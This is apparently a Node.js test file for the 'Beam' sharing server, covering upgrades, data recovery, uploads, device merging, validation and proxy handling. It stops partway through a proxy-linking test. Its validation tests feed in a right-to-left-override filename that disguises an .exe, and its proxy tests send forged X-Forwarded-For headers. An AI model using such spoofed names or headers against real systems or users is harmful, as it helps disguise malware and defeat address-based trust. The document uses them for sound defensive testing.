#!/usr/bin/env node
// Beam server tests. No dependencies. Starts its own scratch servers on 127.0.0.1:8791–8799 with temporary data
// folders (Tailscale lookups off, or a fake LocalAPI), so it never touches a real Beam.
//   node test/server.test.js            run everything
//   node test/server.test.js csrf move  run the tests whose names contain one of the words
'use strict';

const assert = require('node:assert/strict');
const http = require('node:http');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const crypto = require('node:crypto');
const zlib = require('node:zlib');
const { spawn, spawnSync, execFileSync } = require('node:child_process');

const ROOT = path.resolve(__dirname, '..');
const SERVER = path.join(ROOT, 'server.js');
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'beam-test-'));
const IS_WIN = process.platform === 'win32';
const sleep = ms => new Promise(r => setTimeout(r, ms));

// ---------------------------------------------------------------- harness

const children = new Set();
process.on('exit', () => { for (const c of children) try { c.kill(); } catch {} });

function cleanEnv(extra) {
  const out = {};
  for (const [k, v] of Object.entries(process.env)) if (!k.startsWith('BEAM_')) out[k] = v;
  return { ...out, ...extra };
}

function serverEnv(port, dir, env = {}) {
  return cleanEnv({
    BEAM_HOST: '127.0.0.1', BEAM_PORT: String(port), BEAM_DATA: path.join(dir, 'data'), BEAM_DIST: path.join(dir, 'dist'),
    // Wake-on-LAN packets go to a harmless local port unless a test listens for them: never onto the real network.
    BEAM_TAILSCALE: 'off', BEAM_TEST_TIMEOUTS: '1', BEAM_WOL_TARGETS: '127.0.0.1:9', ...env,
  });
}

// Starts server.js on `port` with data in TMP/<name>. keep: reuse the folder as it is.
async function startServer(name, port, { env = {}, keep = false, args = [], expectExit = false } = {}) {
  assert.ok(port >= 8791 && port <= 8799, 'test ports are 8791–8799');
  const dir = path.join(TMP, name);
  if (!keep) fs.rmSync(dir, { recursive: true, force: true });
  fs.mkdirSync(path.join(dir, 'data'), { recursive: true });
  fs.mkdirSync(path.join(dir, 'dist'), { recursive: true });
  const child = spawn(process.execPath, [SERVER, ...args], { env: serverEnv(port, dir, env), stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true });
  children.add(child);
  let out = '';
  child.stdout.on('data', d => { out += d; });
  child.stderr.on('data', d => { out += d; });
  const exited = new Promise(resolve => child.once('exit', code => { children.delete(child); resolve(code); }));
  const srv = {
    port, dir, data: path.join(dir, 'data'), dist: path.join(dir, 'dist'), child, exited,
    get out() { return out; },
    get key() { return fs.readFileSync(path.join(dir, 'data', 'key'), 'utf8').trim(); },
    stop: async () => { if (child.exitCode === null) { child.kill(); await exited; } },
    req: (method, route, opts) => request(port, method, route, opts),
  };
  if (expectExit) return srv;
  const deadline = Date.now() + 15000;
  while (!/is running/.test(out)) {
    if (child.exitCode !== null) throw new Error(`server ${name} exited: ${out}`);
    if (Date.now() > deadline) throw new Error(`server ${name} did not start: ${out}`);
    await sleep(50);
  }
  return srv;
}

function request(port, method, route, { headers = {}, body, raw = false, timeout = 20000 } = {}) {
  return new Promise((resolve, reject) => {
    let got = null;
    const r = http.request({ host: '127.0.0.1', port, method, path: route, headers, agent: false }, res => {
      got = { status: res.statusCode, headers: res.headers };
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => {
        const buf = Buffer.concat(chunks);
        let json;
        try { json = JSON.parse(buf.toString('utf8')); } catch {}
        resolve({ ...got, body: raw ? buf : buf.toString('utf8'), json });
      });
      res.on('error', () => resolve({ ...got, body: '', json: null, reset: true }));
    });
    r.setTimeout(timeout, () => r.destroy(new Error('timeout')));
    r.on('error', e => (got ? resolve({ ...got, body: '', json: null, reset: true }) : ['ECONNRESET', 'EPIPE', 'ECONNABORTED'].includes(e.code) ? resolve({ status: 'reset', headers: {}, body: '', json: null }) : reject(e)));
    r.end(body);
  });
}

// An event stream; events[] fills as they arrive.
function openEvents(port, headers, route = '/api/events') {
  return new Promise((resolve, reject) => {
    const events = [];
    let closed = false;
    const r = http.request({ host: '127.0.0.1', port, path: route, headers, agent: false }, res => {
      let buf = '';
      res.on('data', d => {
        buf += d;
        let i;
        while ((i = buf.indexOf('\n\n')) >= 0) {
          const block = buf.slice(0, i);
          buf = buf.slice(i + 2);
          // Split on \n only, as EventSource does (a regex's . and $ would also stop at U+2028 inside the JSON).
          const lines = block.split('\n');
          const event = lines.find(l => l.startsWith('event: '))?.slice(7);
          const data = lines.find(l => l.startsWith('data: '))?.slice(6);
          if (event) events.push({ event, data: data ? JSON.parse(data) : null });
        }
      });
      res.on('close', () => { closed = true; });
      resolve({ events, res, get closed() { return closed; }, close: () => r.destroy(), wait: (name, pred = () => true, ms = 5000) => waitFor(() => events.find(e => e.event === name && pred(e.data)), ms) });
    });
    r.on('error', e => (e.code === 'ECONNRESET' ? null : reject(e)));
    r.end();
  });
}

async function waitFor(check, ms = 5000, step = 50) {
  const deadline = Date.now() + ms;
  for (;;) {
    const v = await check();
    if (v) return v;
    if (Date.now() > deadline) throw new Error('timed out waiting');
    await sleep(step);
  }
}

const app = (key, id, name = id, platform = 'windows', extra = {}) => ({
  Authorization: `Bearer ${key}`, 'X-Beam-Device-Id': id, 'X-Beam-Device': encodeURIComponent(name), 'X-Beam-Platform': platform, ...extra,
});
const json = (headers = {}) => ({ 'Content-Type': 'application/json', ...headers });
const cookie = (secret, deviceId, extra = {}) => ({ Cookie: `beam_key=${encodeURIComponent(secret)}${deviceId ? `; beam_device_id=${deviceId}` : ''}`, ...extra });
const sameOrigin = { 'Sec-Fetch-Site': 'same-origin' };
const from = ip => ({ 'X-Forwarded-For': ip }); // requests arrive from loopback, a trusted proxy
const cookieValue = res => /beam_key=([^;]*)/.exec([].concat(res.headers['set-cookie'] || []).join('\n'))?.[1];
const post = (srv, route, body, headers) => srv.req('POST', route, { headers: json(headers), body: JSON.stringify(body) });

async function sendText(srv, headers, text, to) {
  const r = await post(srv, '/api/text', { text, ...(to && { to }) }, headers);
  assert.equal(r.status, 201, r.body);
  return r.json;
}

async function upload(srv, headers, name, data, extra = {}) {
  const init = await post(srv, '/api/uploads', { name, size: data.length, ...extra }, headers);
  assert.equal(init.status, 201, init.body);
  const r = await srv.req('PUT', `/api/uploads/${init.json.id}?offset=0`, { headers: { ...headers, 'Content-Type': 'application/octet-stream' }, body: data });
  assert.equal(r.status, 201, r.body);
  return r.json.item;
}

// A fake tailscaled LocalAPI (unix socket or Windows named pipe) with made-up machines and accounts.
let fakeCount = 0;
function fakeTailscale({ self = [], peers = [], whois = {}, servePort = null } = {}) {
  const where = IS_WIN ? `\\\\.\\pipe\\beam-test-ts-${process.pid}-${++fakeCount}` : path.join(TMP, `ts-${++fakeCount}.sock`);
  const users = {};
  const peerMap = {};
  peers.forEach((p, i) => {
    users[100 + i] = { LoginName: p.user || 'someone@example.com' };
    peerMap[`peer${i}`] = { ID: `nPEER${i}`, HostName: p.name, DNSName: p.dns ?? `${p.name}.tail1234.ts.net.`, TailscaleIPs: p.ips, UserID: 100 + i };
  });
  const server = http.createServer((req, res) => {
    const u = new URL(req.url, 'http://local-tailscaled.sock');
    const reply = (status, body) => { res.writeHead(status, { 'Content-Type': 'application/json' }); res.end(JSON.stringify(body)); };
    if (u.pathname === '/localapi/v0/status') return reply(200, { Self: { HostName: 'beam-host', TailscaleIPs: self, UserID: 1 }, Peer: peerMap, User: { 1: { LoginName: 'owner@example.com' }, ...users } });
    if (u.pathname === '/localapi/v0/whois') {
      const addr = u.searchParams.get('addr') || '';
      const ip = addr.startsWith('[') ? addr.slice(1, addr.indexOf(']')) : addr.split(':')[0];
      const w = whois[ip];
      const addresses = (w?.ips || [ip]).map(a => `${a}/${a.includes(':') ? 128 : 32}`);
      const answer = () => (w ? reply(200, { UserProfile: { LoginName: w.login, DisplayName: w.login }, Node: { ComputedName: w.node || 'machine', StableID: w.stableId || `n${ip.replace(/\W/g, '')}`, Addresses: addresses } }) : reply(404, {}));
      return fake.delay ? setTimeout(answer, fake.delay) : answer();
    }
    if (u.pathname === '/localapi/v0/serve-config') return reply(200, servePort ? { Web: { 'beam.tail1234.ts.net:443': { Handlers: { '/': { Proxy: `http://127.0.0.1:${servePort}` } } } } } : {});
    reply(404, {});
  });
  const fake = { socket: where, delay: 0, close: () => new Promise(r => server.close(r)) };
  return new Promise(resolve => server.listen(where, () => resolve(fake)));
}

// Tailscale serve forwards requests from loopback with these headers.
const viaServe = (ip, login, extra = {}) => ({ 'X-Forwarded-For': ip, 'X-Forwarded-Proto': 'https', 'X-Forwarded-Host': 'beam.tail1234.ts.net', Host: 'beam.tail1234.ts.net', ...(login && { 'Tailscale-User-Login': login }), ...extra });

function runNode(args, env, { timeout = 60000 } = {}) {
  return new Promise(resolve => {
    const child = spawn(process.execPath, [SERVER, ...args], { env, stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true });
    children.add(child);
    let out = '';
    child.stdout.on('data', d => { out += d; });
    child.stderr.on('data', d => { out += d; });
    const timer = setTimeout(() => child.kill(), timeout);
    child.on('exit', code => { clearTimeout(timer); children.delete(child); resolve({ code, out }); });
  });
}

// Minimal .tar.gz listing for checks (the server's own reader is exercised by import).
function tarNames(gz) {
  const data = zlib.gunzipSync(gz);
  const names = [];
  for (let off = 0; off + 512 <= data.length;) {
    const block = data.subarray(off, off + 512);
    if (block.every(b => b === 0)) break;
    const name = block.subarray(0, 100).toString('utf8').replace(/\0.*$/s, '');
    const size = parseInt(block.subarray(124, 136).toString('ascii').replace(/\0.*$/s, '').trim() || '0', 8);
    names.push(name);
    off += 512 + Math.ceil(size / 512) * 512;
  }
  return names;
}

const tests = [];
const test = (name, fn) => tests.push({ name, fn });

// ---------------------------------------------------------------- compatibility with existing clients

test('legacy client with the master key keeps working (text, upload, download, ack, events)', async () => {
  const s = await startServer('compat', 8791);
  try {
    const K = s.key;
    const phone = app(K, 'phone000001', 'Pixel', 'android');
    const desk = app(K, 'desk0000001', 'Desktop', 'windows');
    const me = await s.req('GET', '/api/me', { headers: desk });
    assert.equal(me.status, 200);
    assert.equal(me.json.you, 'desk0000001');
    const ev = await openEvents(s.port, phone);
    await ev.wait('hello');
    const t = await sendText(s, desk, 'hello', ['Pixel']);
    assert.deepEqual(t.to, ['phone000001']);
    await ev.wait('item', d => d.id === t.id);
    const data = crypto.randomBytes(300_000);
    const item = await upload(s, desk, 'photo.bin', data, { to: ['phone000001'] });
    const dl = await s.req('GET', `/api/file/${item.id}`, { headers: phone, raw: true });
    assert.equal(Buffer.compare(dl.body, data), 0);
    const ack = await s.req('POST', `/api/items/${t.id}/ack`, { headers: phone });
    assert.ok(ack.json.delivered.phone000001);
    const upd = await ev.wait('update', d => d.id === t.id);
    assert.ok(upd.data.delivered.phone000001, 'update events always carry the full delivered map');
    const list = await s.req('GET', '/api/items', { headers: phone });
    assert.equal(list.json.items.length, 2);
    assert.equal(list.json.items[0].ip, undefined, 'no client addresses in items');
    ev.close();
  } finally { await s.stop(); }
});

test('upgrade: a v2 data folder loads and its clients carry on', async () => {
  const dir = path.join(TMP, 'upgrade', 'data');
  fs.rmSync(path.join(TMP, 'upgrade'), { recursive: true, force: true });
  for (const d of ['files', 'uploads']) fs.mkdirSync(path.join(dir, d), { recursive: true });
  const key = 'v2-master-key-abcdefghijklmnopqrstuv';
  fs.writeFileSync(path.join(dir, 'key'), key + '\n');
  fs.writeFileSync(path.join(dir, 'server-id'), 'aaaabbbbccccddddeeeeffff\n');
  const salt = crypto.randomBytes(16);
  fs.writeFileSync(path.join(dir, 'password.json'), JSON.stringify({ salt: salt.toString('base64'), hash: crypto.scryptSync('old password', salt, 32).toString('base64') }));
  const t0 = Date.now() - 3600e3;
  fs.writeFileSync(path.join(dir, 'devices.json'), JSON.stringify({
    desktop00001: { id: 'desktop00001', name: 'Desktop', platform: 'windows', firstSeen: t0, lastSeen: t0, ip: '127.0.0.1', machine: 'host' },
    phone0000001: { id: 'phone0000001', name: 'Pixel', platform: 'android', firstSeen: t0, lastSeen: t0, ip: '100.70.248.8', machine: '100.70.248.8' },
    lanbrowser01: { id: 'lanbrowser01', name: 'Chrome on Windows', platform: 'web', firstSeen: t0, lastSeen: t0, ip: '192.168.1.40', machine: '192.168.1.40' },
  }));
  fs.writeFileSync(path.join(dir, 'aliases.json'), JSON.stringify({ oldbrowser01: 'desktop00001' }));
  fs.writeFileSync(path.join(dir, 'files', '1111111111111111'), 'photo');
  fs.writeFileSync(path.join(dir, 'items.json'), JSON.stringify([
    { id: '1111111111111111', kind: 'file', name: 'photo.jpg', size: 5, mime: 'image/jpeg', from: 'phone0000001', device: 'Pixel', to: ['desktop00001'], delivered: {}, ip: '100.70.248.8', ts: t0 },
    { id: '2222222222222222', kind: 'text', text: 'q'.repeat(70_000), from: 'desktop00001', device: 'Desktop', to: [], delivered: { phone0000001: t0 }, ip: '127.0.0.1', ts: t0 + 1 },
  ]));
  fs.writeFileSync(path.join(dir, 'uploads', '3333333333333333.json'), JSON.stringify({ id: '3333333333333333', name: 'big.iso', size: 10, mime: 'application/octet-stream', to: [], from: 'phone0000001', device: 'Pixel', ip: '100.70.248.8', offset: 0, touched: Date.now() }));
  fs.writeFileSync(path.join(dir, 'uploads', '3333333333333333.part'), 'abcd');
  const s = await startServer('upgrade', 8791, { keep: true });
  try {
    const desk = app(key, 'desktop00001', 'Desktop', 'windows');
    const items = (await s.req('GET', '/api/items', { headers: desk })).json.items;
    assert.equal(items.length, 2);
    assert.ok(items.every(i => i.ip === undefined));
    assert.equal((await s.req('GET', '/api/items/2222222222222222/text', { headers: desk })).body.length, 70_000);
    assert.equal((await s.req('GET', '/api/me', { headers: app(key, 'oldbrowser01') })).json.you, 'desktop00001', 'old aliases still apply');
    const up = await s.req('GET', '/api/uploads/3333333333333333', { headers: desk });
    assert.equal(up.json.offset, 4, 'an upload in progress survives the upgrade');
    assert.equal((await s.req('PUT', '/api/uploads/3333333333333333?offset=4', { headers: { ...desk, 'Content-Type': 'application/octet-stream' }, body: 'efghij' })).status, 201);
    const pw = await post(s, '/api/login', { secret: 'old password', client: 'app' }, from('100.64.1.9'));
    assert.equal(pw.status, 200, 'the v2 password still works');
    // a LAN browser from v2 is no longer linked by its LAN address
    const lan = await s.req('GET', '/api/me', { headers: { ...cookie(key, 'lanbrowser01', { 'X-Beam-Platform': 'web' }), ...from('192.168.1.40') } });
    assert.equal(lan.json.you, 'lanbrowser01');
    await sleep(300);
    assert.doesNotMatch(fs.readFileSync(path.join(dir, 'items.json'), 'utf8'), /"ip"/);
  } finally { await s.stop(); }
});

test('SSE: hello first, named ping events, HEAD is refused without presence', async () => {
  const s = await startServer('sse', 8791);
  try {
    const K = s.key;
    const ev = await openEvents(s.port, app(K, 'ssedev00001', 'SSE', 'android'));
    await ev.wait('hello', d => d.api === 3 && /^[a-f0-9]{12}$/.test(d.web) && d.serverId && d.version);
    assert.equal(ev.events[0].event, 'hello');
    await ev.wait('ping', () => true, 3000);
    const head = await s.req('HEAD', '/api/events', { headers: app(K, 'headdev0001', 'Head', 'android') });
    assert.equal(head.status, 405);
    const devs = await s.req('GET', '/api/devices', { headers: app(K, 'ssedev00001') });
    assert.equal(devs.json.devices.find(d => d.id === 'headdev0001')?.online ?? false, false);
    ev.close();
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- A1/A2 data safety

test('A1: damaged items.json is recovered from .bak and no file is ever deleted', async () => {
  let s = await startServer('a1', 8791);
  const K = s.key;
  const h = app(K, 'a1dev000001');
  for (let i = 0; i < 3; i++) await upload(s, h, `f${i}.txt`, Buffer.from(`file ${i}`));
  await sleep(500); // let the last save finish (an unfinished one would be recovered from items.json.tmp)
  await s.stop();
  assert.ok(fs.existsSync(path.join(s.data, 'items.json.bak')), 'the previous version is kept as .bak');
  fs.writeFileSync(path.join(s.data, 'items.json'), ''); // e.g. a power cut after an unsynced write
  s = await startServer('a1', 8791, { keep: true });
  try {
    const list = await s.req('GET', '/api/items', { headers: h });
    assert.equal(list.json.items.length, 2, 'recovered the previous version');
    const files = fs.readdirSync(path.join(s.data, 'files')).length;
    const orphaned = fs.readdirSync(path.join(s.data, 'orphaned')).length;
    assert.equal(files + orphaned, 3, 'every stored file still exists');
    assert.equal(orphaned, 1);
    assert.ok(fs.readdirSync(s.data).some(f => f.startsWith('items.json.broken-')));
    assert.match(s.out, /recovered it from items\.json\.bak/);
  } finally { await s.stop(); }
});

test('A1: wrong-type, null and [null] state files neither crash the server nor lose files', async () => {
  let s = await startServer('a1b', 8791);
  const h = app(s.key, 'a1bdev00001');
  await upload(s, h, 'a.txt', Buffer.from('a'));
  await s.stop();
  fs.rmSync(path.join(s.data, 'items.json.bak'), { force: true });
  fs.writeFileSync(path.join(s.data, 'items.json'), '{"oops":true}');
  fs.writeFileSync(path.join(s.data, 'devices.json'), 'null');
  s = await startServer('a1b', 8791, { keep: true });
  await s.stop();
  assert.ok(fs.readdirSync(s.data).some(f => /^items\.json\.broken-/.test(f)), 'wrong-type items.json is kept as .broken');
  assert.equal(fs.readdirSync(path.join(s.data, 'files')).length + fs.readdirSync(path.join(s.data, 'orphaned')).length, 1);
  fs.writeFileSync(path.join(s.data, 'items.json'), '[null, {"id":"nope"}]');
  s = await startServer('a1b', 8791, { keep: true });
  try {
    assert.equal((await s.req('GET', '/api/items', { headers: h })).status, 200);
    assert.match(s.out, /Dropped 2 invalid entries/);
  } finally { await s.stop(); }
});

test('A2: a save blocked by another program is retried until it works (Windows)', async () => {
  if (!IS_WIN) return;
  const s = await startServer('a2', 8791);
  try {
    const h = app(s.key, 'a2dev000001');
    await sendText(s, h, 'one');
    await sleep(300);
    const file = path.join(s.data, 'items.json');
    const lock = spawn('powershell.exe', ['-NoProfile', '-Command', `$f=[IO.File]::Open('${file}','Open','Read','Read'); Start-Sleep -Seconds 3; $f.Close()`], { stdio: 'ignore', windowsHide: true });
    const unlocked = new Promise(r => lock.on('exit', r));
    await sleep(1200);
    await sendText(s, h, 'two'); // answered once saved (so after the lock), or after 5 s at most
    await unlocked;
    await waitFor(() => fs.readFileSync(file, 'utf8').includes('"two"'), 10000);
    assert.match(s.out, /Couldn't save items\.json .*will retry/);
    assert.match(s.out, /Saved items\.json after/);
  } finally { await s.stop(); }
});

test('A2b: the data folder is made private at start (another account could read the key); BEAM_DATA_ACL=keep leaves it (1.6.2)', async () => {
  let s = await startServer('a2b', 8791);
  await s.stop();
  if (IS_WIN) {
    const icacls = (...args) => spawnSync('icacls.exe', args, { windowsHide: true, encoding: 'utf8' });
    const sddl = () => {
      const f = path.join(s.dir, 'acl.txt');
      icacls(s.data, '/save', f);
      const text = fs.readFileSync(f).toString('utf16le').split(/\r?\n/)[1] || '';
      fs.rmSync(f, { force: true });
      return text;
    };
    const broad = text => /;(AU|BU|WD|S-1-5-11|S-1-5-32-545|S-1-1-0)\)/.test(text);
    // As a folder on a second drive gets it: Authenticated Users may change it, Users may read it.
    icacls(s.data, '/grant', '*S-1-5-11:(OI)(CI)M', '*S-1-5-32-545:(OI)(CI)RX');
    assert.ok(broad(sddl()), 'other accounts have access before');
    s = await startServer('a2b', 8791, { keep: true });
    await s.stop();
    assert.ok(!broad(sddl()), `only this account, SYSTEM and Administrators after: ${sddl()}`);
    assert.match(s.out, /Made the data folder .* private to this account/);
    const key = path.join(s.data, 'key');
    assert.ok(!/(AU|BU)\)/.test((() => { const f = path.join(s.dir, 'k.txt'); icacls(key, '/save', f); const t = fs.readFileSync(f).toString('utf16le'); fs.rmSync(f); return t; })()), 'the key file follows');
    // Already private: nothing to do, nothing logged.
    s = await startServer('a2b', 8791, { keep: true });
    await s.stop();
    assert.doesNotMatch(s.out, /Made the data folder/);
    // Opted out.
    icacls(s.data, '/grant', '*S-1-5-32-545:(OI)(CI)RX');
    s = await startServer('a2b', 8791, { keep: true, env: { BEAM_DATA_ACL: 'keep' } });
    await s.stop();
    assert.ok(broad(sddl()), 'BEAM_DATA_ACL=keep leaves it');
  } else {
    fs.chmodSync(s.data, 0o755);
    s = await startServer('a2b', 8791, { keep: true });
    await s.stop();
    assert.equal(fs.statSync(s.data).mode & 0o777, 0o700, 'made 700');
  }
});

// ---------------------------------------------------------------- A3 uploads

function stalledPut(port, route, headers, total, first) {
  const r = http.request({ host: '127.0.0.1', port, method: 'PUT', path: route, agent: false, headers: { ...headers, 'Content-Type': 'application/octet-stream', 'Content-Length': total } });
  const done = new Promise(resolve => { r.on('error', () => resolve('error')); r.on('response', res => { res.resume(); res.on('end', () => resolve(res.statusCode)); }); r.on('close', () => resolve('closed')); });
  r.write(first);
  return { r, done };
}

test('A3: a stalled chunk is taken over, times out, and cancelling mid-chunk is clean', async () => {
  const s = await startServer('a3', 8791);
  try {
    const h = app(s.key, 'a3dev000001', 'Up', 'android');
    const data = crypto.randomBytes(200_000);
    const init = await post(s, '/api/uploads', { name: 'v.bin', size: data.length }, h);
    const id = init.json.id;
    const stall = stalledPut(s.port, `/api/uploads/${id}?offset=0`, h, data.length, data.subarray(0, 50_000));
    await sleep(300);
    // (small bodies: the server answers before reading them, and a big unread body would reset the connection)
    let r = await s.req('PUT', `/api/uploads/${id}?offset=0`, { headers: h, body: data.subarray(0, 10) });
    assert.equal(r.status, 409);
    assert.match(r.json.error, /still being written/);
    await sleep(1700); // idle beyond the takeover limit (30 s normally)
    r = await s.req('PUT', `/api/uploads/${id}?offset=0`, { headers: h, body: data.subarray(0, 10) });
    assert.equal(r.status, 409, 'took over, then reports the real offset');
    assert.match(r.json.error, /Wrong offset/);
    const offset = r.json.offset;
    assert.ok(offset > 0);
    r = await s.req('PUT', `/api/uploads/${id}?offset=${offset}`, { headers: h, body: data.subarray(offset) });
    assert.equal(r.status, 201);
    const dl = await s.req('GET', `/api/file/${id}`, { headers: h, raw: true });
    assert.equal(Buffer.compare(dl.body, data), 0);
    await stall.done;

    // body idle timeout
    const init2 = await post(s, '/api/uploads', { name: 'w.bin', size: 100_000 }, h);
    const stall2 = stalledPut(s.port, `/api/uploads/${init2.json.id}?offset=0`, h, 100_000, Buffer.alloc(10_000));
    await stall2.done;
    // (the server fsyncs what arrived before it reports the new offset, a moment after the connection closes)
    await waitFor(async () => (await s.req('GET', `/api/uploads/${init2.json.id}`, { headers: h })).json.offset === 10_000, 3000)
      .catch(() => assert.fail('the idle chunk was cut off and its bytes kept'));

    // cancel while a chunk is being written
    const stall3 = stalledPut(s.port, `/api/uploads/${init2.json.id}?offset=10000`, h, 90_000, Buffer.alloc(5_000));
    await sleep(300);
    const del = await s.req('DELETE', `/api/uploads/${init2.json.id}`, { headers: h });
    assert.equal(del.status, 204);
    await stall3.done;
    await sleep(200);
    assert.doesNotMatch(s.out, /Request failed/, 'no server error logged');
    assert.equal((await s.req('GET', `/api/uploads/${init2.json.id}`, { headers: h })).status, 404);
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- A4 merges

test('A4: merges rewrite pending uploads, tokens and read markers; old ids still work as targets', async () => {
  const s = await startServer('a4', 8791);
  try {
    const K = s.key;
    const sender = app(K, 'sender00001', 'Phone', 'android', from('100.64.1.1'));
    // A browser signs in with the password on a laptop (machine 100.64.2.2)
    await post(s, '/api/password', { password: 'correct horse battery' }, app(K, 'sender00001'));
    const login = await post(s, '/api/login', { secret: 'correct horse battery' }, { ...sameOrigin, ...from('100.64.2.2'), Cookie: 'beam_device_id=browser0001' });
    assert.equal(login.status, 204);
    const token = cookieValue(login);
    assert.ok(token.startsWith('bt_'));
    const browser = { ...cookie(token, 'browser0001', { ...sameOrigin, 'X-Beam-Platform': 'web' }), ...from('100.64.2.2') };
    assert.equal((await s.req('GET', '/api/me', { headers: browser })).json.you, 'browser0001');
    await s.req('PUT', '/api/read', { headers: json(browser), body: JSON.stringify({ conversation: 'all', ts: 1234 }) });
    const init = await post(s, '/api/uploads', { name: 'a.bin', size: 3, to: ['browser0001'] }, sender);
    // The laptop's Beam app shows up: the browser is merged into it
    const laptop = app(K, 'laptopapp01', 'Laptop', 'windows', from('100.64.2.2'));
    await s.req('GET', '/api/me', { headers: laptop });
    const done = await s.req('PUT', `/api/uploads/${init.json.id}?offset=0`, { headers: sender, body: 'abc' });
    assert.deepEqual(done.json.item.to, ['laptopapp01']);
    const me = await s.req('GET', '/api/me', { headers: browser });
    assert.equal(me.json.you, 'laptopapp01', 'the browser token now belongs to the app');
    assert.equal(me.json.read.all, 1234, 'read markers moved along');
    assert.equal(me.headers['x-beam-you'], 'laptopapp01');
    const t = await sendText(s, sender, 'to the old id', ['browser0001']);
    assert.deepEqual(t.to, ['laptopapp01']);
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- A5 validation

test('A5: bodies must be objects, `to` must be a list, names are cleaned, ip is stripped', async () => {
  let s = await startServer('a5', 8791);
  const K = s.key;
  const h = app(K, 'a5dev000001', 'Dev‮ice', 'windows');
  try {
    for (const route of ['/api/password', '/api/uploads', '/api/login-requests/approve', '/api/text', '/api/settings']) {
      const r = await s.req(route === '/api/settings' ? 'PATCH' : 'POST', route, { headers: json(h), body: 'null' });
      assert.equal(r.status, 400, `${route}: ${r.body}`);
    }
    for (const route of ['/api/login', '/api/login-requests']) {
      const r = await s.req('POST', route, { headers: json(from('100.64.9.9')), body: 'null' });
      assert.equal(r.status, 400, route);
    }
    for (const to of [{ id: 'x' }, 12345, [1, 2]]) {
      const r = await post(s, '/api/text', { text: 'private', to }, h);
      assert.equal(r.status, 400, JSON.stringify(to));
    }
    const devs = await s.req('GET', '/api/devices', { headers: h });
    assert.equal(devs.json.devices[0].name, 'Device', 'bidi controls stripped from device names');
    const long = 'a'.repeat(199) + '\u{1F600}' + '.txt';
    let r = await s.req('PUT', `/api/file?name=${encodeURIComponent(long)}`, { headers: h, body: 'x' });
    assert.equal(r.status, 201);
    assert.ok(r.json.name.endsWith('.txt'), 'extension kept when shortening');
    assert.equal((await s.req('GET', `/api/file/${r.json.id}`, { headers: h })).status, 200, 'still downloadable');
    r = await s.req('PUT', `/api/file?name=${encodeURIComponent('invoice‮gpj.exe')}`, { headers: h, body: 'MZ' });
    assert.equal(r.json.name, 'invoicegpj.exe');
  } finally { await s.stop(); }
  // items stored with an address from older versions lose it
  const file = path.join(s.data, 'items.json');
  const list = JSON.parse(fs.readFileSync(file, 'utf8'));
  list[0].ip = '100.64.1.1';
  fs.writeFileSync(file, JSON.stringify(list));
  s = await startServer('a5', 8791, { keep: true });
  await sleep(300);
  await s.stop();
  assert.doesNotMatch(fs.readFileSync(file, 'utf8'), /"ip"/);
});

test('A5/C3: ranges, If-Range, ETag and zero-byte files', async () => {
  const s = await startServer('range', 8791);
  try {
    const h = app(s.key, 'rangedev001');
    const f = (await s.req('PUT', '/api/file?name=r.txt', { headers: h, body: '0123456789' })).json;
    const get = hdrs => s.req('GET', `/api/file/${f.id}`, { headers: { ...h, ...hdrs } });
    let r = await get({ Range: 'bytes=5-2' });
    assert.equal(r.status, 200, 'an invalid range is ignored');
    r = await get({ Range: 'bytes=-0' });
    assert.equal(r.status, 416);
    r = await get({ Range: 'bytes=8-' });
    assert.equal(r.status, 206);
    assert.equal(r.body, '89');
    const etag = r.headers.etag;
    assert.ok(etag && r.headers['last-modified']);
    r = await get({ Range: 'bytes=8-', 'If-Range': etag });
    assert.equal(r.status, 206);
    r = await get({ Range: 'bytes=8-', 'If-Range': '"something-else"' });
    assert.equal(r.status, 200, 'If-Range mismatch sends the whole file');
    r = await get({ 'If-None-Match': etag });
    assert.equal(r.status, 304);
    const empty = (await s.req('PUT', '/api/file?name=e.txt', { headers: h, body: '' })).json;
    r = await s.req('GET', `/api/file/${empty.id}`, { headers: { ...h, Range: 'bytes=0-' } });
    assert.equal(r.status, 200);
    const t = await sendText(s, h, 'x'.repeat(100));
    r = await s.req('GET', `/api/items/${t.id}/text`, { headers: h });
    assert.equal(r.headers['x-content-type-options'], 'nosniff');
    assert.match(r.headers['content-security-policy'], /sandbox/);
    assert.equal((await s.req('GET', `/api/items/${t.id}/text`, { headers: { ...h, 'If-None-Match': r.headers.etag } })).status, 304);
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- A7 proxies & linking

test('A7: behind a proxy that hides addresses nothing is linked and autopair refuses', async () => {
  const s = await startServer('proxy', 8791);
  try {
    const K = s.key;
    const P = from('172.17.0.1'); // Docker bridge gateway / NAS proxy: every client looks the same
    await s.req('GET', '/api/me', { headers: app(K, 'workpc00001', 'Work PC', 'windows', P) });
    const phone = await openEvents(s.port, app(K, 'phone000001', 'Pixel', 'android', P));
    await phone.wait('hello');
    let r = await s.req('POST', '/api/autopair', { headers: { ...P, Host: 'beam.nas.lan', ...sameOrigin } });
    assert.equal(r.status, 403, 'no key for strangers');
    r = await s.req('GET', '/api/me', { headers: { ...cookie(K, 'laptopbrow1', { 'X-Beam-Platform': 'web' }), ...P } });
    assert.equal(r.json.you, 'laptopbrow1', 'browser not merged into the phone');
    await s.req('GET', '/api/me', { headers: app(K, 'desktop0001', 'Desktop', 'windows', P) });
    r = await s.req('GET', '/api/me', { headers: app(K, 'workpc00001', 'Work PC', 'windows', P) });
    assert.equal(r.json.you, 'workpc00001', 'a sleeping PC is not merged into another');
    await waitFor(() => /connect from the same address 172\.17\.0\.1.*BEAM_TRUSTED_PROXIES/.test(s.out));
    // An appending proxy: the left part of X-Forwarded-For is the client's own claim and is ignored
    const phone2 = await openEvents(s.port, app(K, 'phone000002', 'Pixel2', 'android', from('100.70.248.8')));
    await phone2.wait('hello');
    r = await s.req('POST', '/api/autopair', { headers: { ...from('100.70.248.8, 100.64.0.99'), ...sameOrigin } });
    assert.equal(r.status, 403);
    phone.close();
    phone2.close();
  } finally { await s.stop(); }
});

test('A7: BEAM_TRUSTED_PROXIES, Tailscale linking, v4/v6 of one machine, reinstall rule', async () => {
  const ts = await fakeTailscale({ peers: [{ name: 'phone', ips: ['100.64.20.20', 'fd7a:115c:a1e0::20'] }] });
